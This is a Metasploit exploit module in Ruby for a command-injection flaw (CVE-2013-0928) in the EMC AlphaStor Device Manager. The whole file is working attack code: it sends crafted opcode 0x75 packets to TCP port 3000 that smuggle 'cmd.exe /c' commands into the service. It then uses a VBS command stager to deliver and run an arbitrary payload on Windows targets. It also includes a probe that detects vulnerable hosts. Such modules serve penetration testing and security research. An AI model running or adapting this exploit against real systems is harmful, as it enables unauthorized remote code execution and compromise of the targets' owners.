require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'EMC AlphaStor Device Manager Opcode 0x75 Command Injection',
      'Description'     => %q{
        This module exploits a flaw within the Device Manager (rrobtd.exe). When parsing the 0x75
        command, the process does not properly filter user supplied input allowing for arbitrary
        command injection. This module has been tested successfully on EMC AlphaStor 4.0 build 116
        with Windows 2003 SP2 and Windows 2008 R2.
      },
      'Author'          =>
        [
          'Anyway <Aniway.Anyway[at]gmail.com>',               # Vulnerability Discovery
          'Preston Thornburn <prestonthornburg[at]gmail.com>', # msf module
          'Mohsan Farid <faridms[at]gmail.com>',               # msf module
          'Brent Morris <inkrypto[at]gmail.com>',              # msf module
          'juan vazquez'                                       # convert aux module into exploit
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['CVE', '2013-0928'],
          ['ZDI', '13-033']
        ],
      'Platform'        => 'win',
      'Arch'            => ARCH_X86,
      'Payload'         =>
        {
          'Space'       => 2048,
          'DisableNops' => true
        },
      'Targets'  =>
          [
            [ 'EMC AlphaStor 4.0 < build 800 / Windows Universal', {} ]
          ],
      'CmdStagerFlavor' => 'vbs',
      'DefaultTarget'   => 0,
      'DisclosureDate'  => 'Jan 18 2013'))
 
    register_options(
      [
        Opt::RPORT(3000)
      ], self.class )
  end
 
  def check
    packet = "\x75~ mminfo & #{rand_text_alpha(512)}"
    res = send_packet(packet)
    if res && res =~ /Could not fork command/
      return Exploit::CheckCode::Detected
    end
 
    Exploit::CheckCode::Unknown
  end
 
  def exploit
    execute_cmdstager({ :linemax => 487 })
  end
 
  def execute_command(cmd, opts)
    padding = rand_text_alpha_upper(489 - cmd.length)
    packet = "\x75~ mminfo &cmd.exe /c #{cmd} & #{padding}"# #{padding}"
    connect
    sock.put(packet)
    begin
      sock.get_once
    rescue EOFError
      fail_with(Failure::Unknown, "Failed to deploy CMD Stager")
    end
    disconnect
  end
 
  def execute_cmdstager_begin(opts)
    if flavor =~ /vbs/ && self.decoder =~ /vbs_b64/
      cmd_list.each do |cmd|
        cmd.gsub!(/data = Replace\(data, vbCrLf, ""\)/, "data = Replace(data, \" \" + vbCrLf, \"\")")
      end
    end
  end
 
  def send_packet(packet)
    connect
 
    sock.put(packet)
    begin
      meta_data = sock.get_once(8)
    rescue EOFError
      meta_data = nil
    end
 
    unless meta_data
      disconnect
      return nil
    end
 
    code, length = meta_data.unpack("N*")
 
    unless code == 1
      disconnect
      return nil
    end
 
    begin
      data = sock.get_once(length)
    rescue EOFError
      data = nil
    ensure
      disconnect
    end
 
    data
  end
 
end